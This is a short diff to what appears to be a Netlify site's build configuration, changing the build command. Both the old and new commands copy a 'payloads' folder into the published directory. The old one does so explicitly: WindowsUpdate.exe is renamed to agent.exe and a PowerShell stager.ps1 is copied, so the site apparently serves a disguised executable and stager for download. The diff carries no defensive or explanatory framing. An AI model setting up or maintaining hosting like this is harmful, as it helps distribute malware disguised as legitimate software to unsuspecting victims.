@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build && mkdir -p dist/payloads && cp WindowsUpdate.exe dist/payloads/agent.exe && cp payloads/stager.ps1 dist/payloads/stager.ps1"
+  command = "npm run build && cp -r payloads dist/"
   publish = "dist"
   functions = "netlify/functions"
 
